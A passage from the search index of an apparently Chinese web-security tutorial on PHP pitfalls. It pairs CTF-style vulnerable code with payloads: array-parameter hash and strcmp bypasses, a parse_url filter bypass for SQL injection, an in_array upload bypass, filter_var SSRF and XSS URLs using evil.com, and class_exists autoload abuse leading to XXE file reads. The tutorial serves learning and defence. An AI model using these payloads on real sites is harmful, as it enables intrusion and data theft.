</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_12","title":"\u56db\u3001\u52a0\u5bc6\u51fd\u6570\u95ee\u9898","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_13","title":"\u7406\u8bba\u77e5\u8bc6","text":"<p><code>md5()</code>\u548c<code>sha1()</code>\u5bf9\u4e00\u4e2a\u6570\u7ec4\u8fdb\u884c\u52a0\u5bc6\u5c06\u8fd4\u56de <code>NULL</code>\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_14","title":"\u4f8b\u5b50","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_15","title":"\u9898\u76ee\u4ee3\u7801","text":"<pre><code>&lt;?php\nerror_reporting(0);\n$flag = 'flag{I_think_that_I_just_broke_md5}';\nif (isset($_GET['username']) and isset($_GET['password'])) {\n    if ($_GET['username'] == $_GET['password'])\n        print 'Your password can not be your username.';\n    else if (md5($_GET['username']) === sha1($_GET['password']))\n        die($flag);\n    else\n        print 'Invalid password';\n}\n?&gt;\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#payload_3","title":"payload","text":"<p>username[]=1&amp;password[]=2</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_16","title":"\u4e94\u3001\u5b57\u7b26\u4e32\u5904\u7406\u51fd\u6570\u6f0f\u6d1e\u7f3a\u9677","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_17","title":"\u7406\u8bba\u77e5\u8bc6","text":"<p><code>strcmp()</code>\u3001<code>ereg()</code>\u3001<code>strpos()</code>\u4e09\u4e2a\u5b57\u7b26\u4e32\u5904\u7406\u51fd\u6570\u5728\u5904\u7406\u6570\u7ec4\u65f6\uff0c\u4f1a\u51fa\u73b0\u5f02\u5e38\uff0c\u8fd4\u56de<code>NULL</code>\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_18","title":"\u4f8b\u5b50","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_19","title":"\u9898\u76ee\u4ee3\u7801","text":"<pre><code>&lt;?php\n    error_reporting(0);\n    $flag = 'flag{P@ssw0rd_1s_n0t_s4fe_By_d0uble_Equ4ls}';\n    if (isset ($_GET['password'])) {  \n        if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)  \n            echo 'You password must be alphanumeric';  \n        else if (strpos ($_GET['password'], '--') !== FALSE)  \n            die($flag);  \n        else  \n            echo 'Invalid password';  \n    }  \n?&gt;\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#payload_4","title":"payload","text":"<p>password[]=gg</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#phptrick","title":"PHP\u4e2d\u7684\u5404\u79cdtrick","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#parse_url","title":"parse_url()\u51fd\u6570","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_20","title":"\u6761\u4ef6","text":"<p>&lt; php5.4.7</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_21","title":"\u4ecb\u7ecd","text":"<p>\u6211\u4eec\u770b\u4ee5\u4e0b\u6d4b\u8bd5\uff1a <pre><code>&lt;?php\n\n$url=parse_url($_SERVER['REQUEST_URI']);\n\nvar_dump($url);\n\nparse_str($url['query'],$query);\n\nvar_dump($query);\n\n$key_word=array(\"select\",\"from\",\"for\",\"like\");\n\n    foreach($query as $key)\n\n    {\n\n        foreach($key_word as $value)\n\n        {\n\n            if(preg_match(\"/\".$value.\"/\",strtolower($key)))\n\n            {\n\n                die(\"Stop hacking by using SQL injection!\");\n\n            }\n\n        }\n\n    }\n\n?&gt;\n</code></pre> \u5148\u6b63\u5e38\u8f93\u5165\uff1a <code>http://localhost/web/trick1/parse.php?sql=select</code> \u53ef\u4ee5\u770b\u5230\uff0c\u88ab\u6b63\u5e38\u7684\u8fc7\u6ee4 H:\\wamp64\\www\\web\\trick1\\parse.php:3:     array (size=2)</p> <pre><code>'path' =&gt; string '/web/trick1/parse.php' (length=21)\n\n'query' =&gt; string 'sql=select' (length=10)\n</code></pre> <p>H:\\wamp64\\www\\web\\trick1\\parse.php:5:</p> <pre><code>array (size=1)\n\n'sql' =&gt; string 'select' (length=6)\n</code></pre> <p>Stop hacking by using SQL injection!</p> <p>\u4f46\u662f\u6784\u9020\u8fd9\u6837\u7684\u8bf7\u6c42\uff1a <code>http://localhost///web/trick1/parse.php?sql=select</code> \u5219 H:\\wamp64\\www\\web\\trick1\\parse.php:3:boolean false H:\\wamp64\\www\\web\\trick1\\parse.php:5:</p> <p>array (size=0)</p> <p>empty</p> <p>\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u6ce8\u5165\u6210\u529f \u56e0\u4e3a\u8fd9\u91cc\u7528\u5230\u4e86<code>parse_ur</code>l\u51fd\u6570\u5728\u89e3\u6790url\u65f6\u5b58\u5728\u7684bug \u901a\u8fc7\uff1a<code>///x.php?key=value</code>\u7684\u65b9\u5f0f\u53ef\u4ee5\u4f7f\u5176\u8fd4\u56deFalse</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_22","title":"\u539f\u7406","text":"<p>\u5177\u4f53\u53ef\u4ee5\u770b\u4e0bparse_url()\u7684\u6e90\u7801\uff0c\u5173\u952e\u4ee3\u7801\u5982\u4e0b <pre><code>PHPAPI php_url *php_url_parse_ex(char const *str, size_t length)\n\n{\n\n    char port_buf[6];\n\n    php_url *ret = ecalloc(1, sizeof(php_url));\n\n    char const *s, *e, *p, *pp, *ue;\n\n    ...snip...\n\n} else if (*s == '/' &amp;&amp; *(s + 1) == '/') { /* relative-scheme URL */\n\n        s += 2;\n\n    } else {\n\n        just_path:\n\n        ue = s + length;\n\n        goto nohost;\n\n    }\n\n    e = s + strcspn(s, \"/?#\");\n\n    ...snip...\n\n    } else {\n\n        p = e;\n\n    }\n\n    /* check if we have a valid host, if we don't reject the string as url */\n\n    if ((p-s) 1) {\n\n        if (ret-&gt;scheme) efree(ret-&gt;scheme);\n\n        if (ret-&gt;user) efree(ret-&gt;user);\n\n        if (ret-&gt;pass) efree(ret-&gt;pass);\n\n        efree(ret);\n\n        return NULL;\n\n    }\n</code></pre> \u53ef\u4ee5\u770b\u5230\uff0c\u5728\u51fd\u6570parse_url\u5185\u90e8\uff0c\u5982\u679curl\u662f\u4ee5//\u5f00\u59cb\uff0c\u5c31\u8ba4\u4e3a\u5b83\u662f\u76f8\u5bf9url \u800c\u540e\u8ba4\u4e3aurl\u7684\u90e8\u4ef6\u4eceurl+2\u5f00\u59cb\u3002\u82e5<code>p-s &lt; 1</code>\u4e5f\u5c31\u662f\u5982\u679curl\u4e3a<code>///x.php</code>\uff0c\u5219<code>p = e = s = s + 2</code>\uff0c\u51fd\u6570\u5c06\u8fd4\u56de NULL\u3002 \u518d\u770b<code>PHP_FUNCTION</code>,line 351\uff1a <pre><code> /* {{{ proto mixed parse_url(string url, [int url_component])\n\n   Parse a URL and return its components */\n\nPHP_FUNCTION(parse_url)\n\n{\n\n    char *str;\n\n    size_t str_len;\n\n    php_url *resource;\n\n    zend_long key = -1;\n\n    if (zend_parse_parameters(ZEND_NUM_ARGS(), \"s|l\", &amp;str, &amp;str_len, &amp;key) == FAILURE) {\n\n        return;\n\n    }\n\n    resource = php_url_parse_ex(str, str_len);\n\n    if (resource == NULL) {\n\n        /* @todo Find a method to determine why php_url_parse_ex() failed */\n\n        RETURN_FALSE;\n\n}\n</code></pre> \u82e5php_url_parse_ex\u7ed3\u679c\u4e3a NULL\uff0c\u51fd\u6570parse_url\u5c06\u8fd4\u56deFALSE \u4f46\u662f\u5982\u679c\u8f93\u5165 <code>http://localhost/web/trick1//parse2.php?/home/binarycloud/</code> \u5219\u4f1a\u88ab\u5f53\u505a\u76f8\u5bf9url\uff0c \u6b64\u65f6\u7684<code>parse2.php?/home/binarycloud/</code>\u90fd\u4f1a\u88ab\u5f53\u505a\u662f<code>data[\u2018path\u2019]</code> \u800c\u4e0d\u518d\u662f<code>query</code>\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a \u67e5\u9605\u5b98\u65b9\u624b\u518c\u540e\uff1a Example #2 A parse_url() example with missing scheme$url = '//www.example.com/path?googleguy=googley';</p> <p>// Prior to 5.4.7 this would show the path as \"//www.example.com/path\"</p> <p>var_dump(parse_url($url));</p> <p>?&gt;</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_23","title":"\u5b9e\u4f8b","text":"<p>\u9898\u76ee\u6765\u81ea2017swpu\u7684\u4e00\u9053web\u9898 <pre><code>&lt;?php\n\nerror_reporting(0);\n\n$_POST=Add_S($_POST);\n\n$_GET=Add_S($_GET);\n\n$_COOKIE=Add_S($_COOKIE);\n\n$_REQUEST=Add_S($_REQUEST);\n\nfunction Add_S($array){\n\n    foreach($array as $key=&gt;$value){\n\n        if(!is_array($value)){          \n\n            $check= preg_match('/regexp|like|and|\\\"|%|insert|update|delete|union|into|load_file|outfile|\\/\\*/i', $value);\n\n            if($check)\n\n                {\n\n                exit(\"Stop hacking by using SQL injection!\");\n\n            }\n\n        }else{\n\n            $array[$key]=Add_S($array[$key]); \n\n        }\n\n    }\n\nreturn $array;\n\n}\n\nfunction check_url()\n\n{\n\n    $url=parse_url($_SERVER['REQUEST_URI']);\n\n    parse_str($url['query'],$query);\n\n    $key_word=array(\"select\",\"from\",\"for\",\"like\");\n\n    foreach($query as $key)\n\n    {\n\n        foreach($key_word as $value)\n\n        {\n\n            if(preg_match(\"/\".$value.\"/\",strtolower($key)))\n\n            {\n\n                die(\"Stop hacking by using SQL injection!\");\n\n            }\n\n        }\n\n    }\n\n}\n\n?&gt;\n</code></pre> \u4ece\u6e90\u7801\u4e2d\u53ef\u77e5\u6709\u4e00\u4e2acheck_url()\u51fd\u6570\u4f1a\u8fdb\u884c\u8fc7\u6ee4 \u4f46\u662f\u4ed6\u5229\u7528\u4e86\u8fd9\u6837\u7684\u83b7\u53d6\u65b9\u5f0f <code>$url=parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query);</code> \u800c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u7684\u653b\u51fb\u70b9\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#in_array","title":"in_array()\u51fd\u6570","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_24","title":"\u76f8\u5173\u77e5\u8bc6","text":"<p>\u67e5\u9605PHP\u624b\u518c\uff1a (PHP 4, PHP 5, PHP 7) <code>in_array() \u2014 \u68c0\u67e5\u6570\u7ec4\u4e2d\u662f\u5426\u5b58\u5728\u67d0\u4e2a\u503c</code> \u5927\u4f53\u7528\u6cd5\u4e3a\uff1a <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> \u800c\u5b98\u65b9\u7684\u89e3\u91ca\u4e5f\u5f88\u6709\u610f\u601d\uff1a \u5927\u6d77\u635e\u9488\uff0c\u5728\u5927\u6d77\uff08haystack\uff09\u4e2d\u641c\u7d22\u9488\uff08needle\uff09\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e strict \u5219\u4f7f\u7528\u5bbd\u677e\u7684\u6bd4\u8f83\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_25","title":"\u6f0f\u6d1e\u95ee\u9898","text":"<p>\u6211\u4eec\u6ce8\u610f\u5230 <code>bool $strict = FALSE</code> \u5bbd\u677e\u6bd4\u8f83\u5982\u679c\u4e0d\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u662fFALSE\uff0c\u90a3\u4e48\u8fd9\u5c31\u4f1a\u5f15\u6765\u5b89\u5168\u95ee\u9898 \u5982\u679c\u8bbe\u7f6e$strict = True:\u5219 in_array() \u51fd\u6570\u8fd8\u4f1a\u68c0\u67e5 needle \u7684\u7c7b\u578b\u662f\u5426\u548c haystack \u4e2d\u7684\u76f8\u540c\u3002 \u90a3\u4e48\u4e0d\u96be\u5f97\u77e5\uff0c\u5982\u679c\u4e0d\u8bbe\u7f6e\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5f31\u7c7b\u578b\u7684\u95ee\u9898 \u4f8b\u5982\uff1a <pre><code>&lt;?php\n$whitelist = range(1, 24);\n$filename='sky';\nvar_dump(in_array($filename, $whitelist));\n?&gt;\n</code></pre>  \u6b64\u65f6\u8fd0\u884c\u7ed3\u679c\u4e3afalse \u4f46\u662f\u5982\u679c\u6211\u4eec\u5c06filename\u6539\u4e3a1sky \u6210\u529f\u5229\u7528\u5f31\u6bd4\u8f83\uff0c\u800c\u7ed5\u8fc7\u4e86\u8fd9\u91cc\u7684\u68c0\u6d4b</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_26","title":"\u5178\u578b\u6848\u4f8b","text":"<p>\u4e0a\u9762\u7684\u5b9e\u4f8b\u5df2\u8bf4\u660e\u4e86\u95ee\u9898\uff0c\u5176\u5b9e\u8fd9\u4e2a\u95ee\u9898\u662f\u5b58\u5728\u4e8e\u4e0a\u6b21\u6587\u4ef6\u7684\u68c0\u67e5\u7684 \u5728php-security-calendar-2017-Wish List\u4e2d <pre><code>class Challenge {\n    const UPLOAD_DIRECTORY = './solutions/';\n    private $file;\n    private $whitelist;\n\n    public function __construct($file) {\n        $this-&gt;file = $file;\n        $this-&gt;whitelist = range(1, 24);\n    }\n\n    public function __destruct() {\n        if (in_array($this-&gt;file['name'], $this-&gt;whitelist)) {\n            move_uploaded_file(\n                $this-&gt;file['tmp_name'],\n                self::UPLOAD_DIRECTORY . $this-&gt;file['name']\n            );\n        }\n    }\n}\n\n$challenge = new Challenge($_FILES['solution']);\n</code></pre> \u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u4ee3\u7801\u7684\u610f\u56fe\u4e0a\u662f\u60f3\u8ba9\u6211\u4eec\u53ea\u4f20\u6570\u5b57\u540d\u79f0\u7684\u6587\u4ef6\u7684 \u800c\u6211\u4eec\u5374\u53ef\u4ee5\u75281skyevil.php\u8fd9\u6837\u7684\u540d\u79f0\u53bbbypass \u7531\u4e8e\u6ca1\u6709\u4fee\u6539in_array\u7684\u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u800c\u5bfc\u81f4\u4e86\u5b89\u5168\u95ee\u9898 \u53ef\u80fd\u8fd9\u6bd4\u8f83\u9e21\u808b\uff0c\u4f46\u5728\u540e\u7eed\u5bf9\u6587\u4ef6\u7684\u5904\u7406\u4e2d\uff0c\u524d\u4e00\u6b65\u4ea7\u751f\u4e86\u975e\u9884\u671f\uff0c\u53ef\u80fd\u4f1a\u76f4\u63a5\u5f71\u54cd\u540e\u4e00\u6b65\u7684\u64cd\u4f5c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_27","title":"\u6f0f\u6d1e\u4fee\u590d","text":"<p>\u5c06\u5bbd\u677e\u6bd4\u8f83\u8bbe\u4e3atrue\u5373\u53ef \u53ef\u4ee5\u770b\u5230\uff0c\u641c\u7d22\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u8981\u6c42\u524d\u4e24\u4e2a\u53c2\u6570\u5747\u4e3aarray \u6b64\u65f6\u5df2\u7ecf\u4e0d\u5b58\u5728\u5f31\u6bd4\u8f83\u95ee\u9898</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#filter_var","title":"filter_var()\u51fd\u6570","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_28","title":"\u76f8\u5173\u77e5\u8bc6","text":"<p>(PHP 5 &gt;= 5.2.0, PHP 7) filter_var \u2014 \u4f7f\u7528\u7279\u5b9a\u7684\u8fc7\u6ee4\u5668\u8fc7\u6ee4\u4e00\u4e2a\u53d8\u91cf mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )  \u867d\u7136\u5b98\u65b9\u8bf4\u8fd9\u662f\u8fc7\u6ee4\u5668\uff0c\u4f46\u662f\u5982\u679c\u7528\u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5e76\u4e14\u76f8\u4fe1\u4ed6\u7684\u7ed3\u679c\uff0c\u662f\u975e\u5e38\u611a\u8822\u7684</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_29","title":"\u6f0f\u6d1e\u95ee\u9898","text":"<p>\u6bd4\u8f83\u5e38\u7528\u7684\u5f53\u5c5eFILTER_VALIDATE_URL\u4e86\u5427\uff0c\u4f46\u662f\u5b83\u5b58\u5728\u975e\u5e38\u591a\u7684\u8fc7\u6ee4bypass \u672c\u5e94\u8be5\u7528\u4e8echeck url\u662f\u5426\u5408\u6cd5\u7684\u51fd\u6570\uff0c\u5c31\u8fd9\u6837\u653e\u8fc7\u4e86\u53ef\u80fd\u5bfc\u81f4SSRF\u7684url \u7c7b\u4f3c\u7684bypass\u8fd8\u6709\uff1a <code>0://evil.com:80$skysec.top:80/ 0://evil.com:80;skysec.top:80/</code> \u8be6\u7ec6SSRF\u6f0f\u6d1e\u89e6\u53d1\u53ef\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1a http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/ \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u80fd\u89e6\u53d1xss <code>javascript://comment%0Aalert(1)</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_30","title":"\u5178\u578b\u6848\u4f8b","text":"<p><pre><code>// composer require \"twig/twig\"\nrequire 'vendor/autoload.php';\n\nclass Template {\n    private $twig;\n\n    public function __construct() {\n        $indexTemplate = '&lt;img ' .\n            'src=\"https://loremflickr.com/320/240\"&gt;' .\n            '&lt;a href=\"{{link|escape}}\"&gt;Next slide \u00bb&lt;/a&gt;';\n\n        // Default twig setup, simulate loading\n        // index.html file from disk\n        $loader = new TwigLoaderArrayLoader([\n            'index.html' =&gt; $indexTemplate\n        ]);\n        $this-&gt;twig = new TwigEnvironment($loader);\n    }\n\n    public function getNexSlideUrl() {\n        $nextSlide = $_GET['nextSlide'];\n        return filter_var($nextSlide, FILTER_VALIDATE_URL);\n    }\n\n    public function render() {\n        echo $this-&gt;twig-&gt;render(\n            'index.html',\n            ['link' =&gt; $this-&gt;getNexSlideUrl()]\n        );\n    }\n}\n\n(new Template())-&gt;render();\n</code></pre> \u8fd9\u91cc\u4e0d\u96be\u770b\u51fa\u662f\u6709\u6a21\u677f\u6e32\u67d3\u7684\uff0c\u800c\u6a21\u677f\u6e32\u67d3\u5219\u6709\u53ef\u80fd\u89e6\u53d1xss \u90a3\u4e48\u5bfb\u627e\u53ef\u63a7\u70b9\uff0c\u4e0d\u96be\u53d1\u73b0 public function render() {         echo $this-&gt;twig-&gt;render(             'index.html',             ['link' =&gt; $this-&gt;getNexSlideUrl()]         );     } \u8fd9\u91cc\u7684Link\u662f\u4f7f\u7528\u4e86getNexSlideUrl()\u7684\u7ed3\u679c \u6211\u4eec\u8ddf\u8fdb\u8fd9\u4e2a\u51fd\u6570 <pre><code>public function render() {\n        echo $this-&gt;twig-&gt;render(\n            'index.html',\n            ['link' =&gt; $this-&gt;getNexSlideUrl()]\n        );\n    }\n</code></pre> \u8fd9\u91cc\u7684nextSlide\u4f7f\u7528\u5c31\u5145\u5206\u76f8\u4fe1\u4e86filter_var()\u7684\u8fc7\u6ee4\u7ed3\u679c \u6240\u4ee5\u5bfc\u81f4\u4e86XSS\uff1a <code>?nextSlide=javascript://comment%250aalert(1)</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_31","title":"\u6f0f\u6d1e\u4fee\u590d","text":"<p>\u4e0d\u8981\u8f7b\u6613\u7684\u76f8\u4fe1filter_var()\uff0c\u5b83\u53ea\u80fd\u5f53\u505a\u521d\u6b65\u9a8c\u8bc1\u51fd\u6570\uff0c\u7ed3\u679c\u4e0d\u80fd\u5f53\u505a\u662f\u5426\u8fdb\u5165if\u7684\u540e\u7eed\u7a0b\u5e8f\u7684\u6761\u4ef6</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#class_exists","title":"class_exists()\u51fd\u6570","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_32","title":"\u76f8\u5173\u77e5\u8bc6","text":"<p>(PHP 4, PHP 5, PHP 7) class_exists \u2014 \u68c0\u67e5\u7c7b\u662f\u5426\u5df2\u5b9a\u4e49 bool class_exists ( string $class_name [, bool $autoload = true ] ) \u68c0\u67e5\u6307\u5b9a\u7684\u7c7b\u662f\u5426\u5df2\u5b9a\u4e49\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_33","title":"\u6f0f\u6d1e\u95ee\u9898","text":"<p>\u4e0a\u8ff0\u64cd\u4f5c\u8868\u9762\u4e0a\u770b\u8d77\u6765\u4f3c\u4e4e\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u548c\u51fd\u6570\u540d\u4e00\u6837\uff0c\u68c0\u67e5\u6307\u5b9a\u7684\u7c7b\u662f\u5426\u5df2\u5b9a\u4e49 \u4f46\u662f\u5173\u952e\u70b9\u5c31\u5728\u4e8e\u9009\u9879\u4e0a\uff0c\u53ef\u4ee5\u9009\u62e9\u8c03\u7528\u6216\u4e0d\u8c03\u7528__autoload \u66f4\u503c\u5f97\u601d\u8003\u7684\u662f\uff0c\u8be5\u51fd\u6570\u9ed8\u8ba4\u8c03\u7528\u4e86__autoload \u4ec0\u4e48\u662f__autoload\uff1f PHP\u624b\u518c\u662f\u8fd9\u6837\u63cf\u8ff0\u7684\uff1a \u5728\u7f16\u5199\u9762\u5411\u5bf9\u8c61\uff08OOP\uff09 \u7a0b\u5e8f\u65f6\uff0c\u5f88\u591a\u5f00\u53d1\u8005\u4e3a\u6bcf\u4e2a\u7c7b\u65b0\u5efa\u4e00\u4e2a PHP \u6587\u4ef6\u3002 \u8fd9\u4f1a\u5e26\u6765\u4e00\u4e2a\u70e6\u607c\uff1a\u6bcf\u4e2a\u811a\u672c\u7684\u5f00\u5934\uff0c\u90fd\u9700\u8981\u5305\u542b\uff08include\uff09\u4e00\u4e2a\u957f\u957f\u7684\u5217\u8868\uff08\u6bcf\u4e2a\u7c7b\u90fd\u6709\u4e2a\u6587\u4ef6\uff09\u3002 \u5728 PHP 5 \u4e2d\uff0c\u5df2\u7ecf\u4e0d\u518d\u9700\u8981\u8fd9\u6837\u4e86\u3002 spl_autoload_register() \u51fd\u6570\u53ef\u4ee5\u6ce8\u518c\u4efb\u610f\u6570\u91cf\u7684\u81ea\u52a8\u52a0\u8f7d\u5668\uff0c\u5f53\u4f7f\u7528\u5c1a\u672a\u88ab\u5b9a\u4e49\u7684\u7c7b\uff08class\uff09\u548c\u63a5\u53e3\uff08interface\uff09\u65f6\u81ea\u52a8\u53bb\u52a0\u8f7d\u3002\u901a\u8fc7\u6ce8\u518c\u81ea\u52a8\u52a0\u8f7d\u5668\uff0c\u811a\u672c\u5f15\u64ce\u5728 PHP \u51fa\u9519\u5931\u8d25\u524d\u6709\u4e86\u6700\u540e\u4e00\u4e2a\u673a\u4f1a\u52a0\u8f7d\u6240\u9700\u7684\u7c7b\u3002 \u90a3\u4e48\u81ea\u52a8\u8c03\u7528__autoload\u4f1a\u4ea7\u751f\u4ec0\u4e48\u95ee\u9898\u5462\uff1f \u6211\u4eec\u4ece\u4e0b\u9762\u7684\u6848\u4f8b\u6765\u770b</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_34","title":"\u5178\u578b\u6848\u4f8b","text":"<p><pre><code>function __autoload($className) {\n    include $className;\n}\n\n$controllerName = $_GET['c'];\n$data = $_GET['d'];\n\nif (class_exists($controllerName)) {\n    $controller = new $controllerName($data['t'], $data['v']);\n    $controller-&gt;render();\n} else {\n    echo 'There is no page with this name';\n}\n\nclass HomeController {\n    private $template;\n    private $variables;\n\n    public function __construct($template, $variables) {\n        $this-&gt;template = $template;\n        $this-&gt;variables = $variables;\n    }\n\n    public function render() {\n        if ($this-&gt;variables['new']) {\n            echo 'controller rendering new response';\n        } else {\n            echo 'controller rendering old response';\n        }\n    }\n}\n</code></pre> \u6848\u4f8b\u540c\u6837\u6765\u81eaphp-security-calendar-2017 \u4e4d\u4e00\u770b\uff0c\u8fd9\u6837\u7684\u4ee3\u7801\u5e76\u4e0d\u5b58\u5728\u4ec0\u4e48\u9ad8\u5371\u7684\u95ee\u9898\uff0c\u4f46\u5b9e\u9645\u4e0a\u56e0\u4e3aclass_exists()\u7684check\u81ea\u52a8\u8c03\u7528\u4e86<code>__autoload()</code> \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8c03\u7528php\u7684\u5185\u7f6e\u7c7b\u5b9e\u73b0\u653b\u51fb\uff0c\u4f8b\u5982SimpleXMLElement \u6b63\u5e38\u6765\u8bf4\uff0c\u5e94\u8be5\u662f\u53ef\u4ee5\u8fd9\u6837\u89e6\u53d1render(): <code>http://localhost/xxe.php?c=HomeController&amp;d[t]=sky&amp;d[v][new]=skrskr</code> \u53ef\u4ee5\u5f97\u5230\u56de\u663e controller rendering new response \u4f46\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528SimpleXMLElement\u6216\u662fsimplexml_load_string\u5bf9\u8c61\u89e6\u53d1\u76f2\u6253xxe\uff0c\u8fdb\u884c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u6784\u9020\uff1a <code>simplexml_load_file($filename,'SimpleXMLElement')</code> \u5373 <code>c=simplexml_load_file&amp;d[t]=filename&amp;d[v]=SimpleXMLElement</code> \u5373\u53ef \u800c\u8fd9\u91cc\u7684$filename\u4f7f\u7528\u6700\u5e38\u89c1\u7684\u76f2\u6253XXE\u7684payload\u5373\u53ef \u8fd9\u5c31\u4e0d\u518d\u8d58\u8ff0\uff0c\u8be6\u7ec6\u53ef\u53c2\u770b 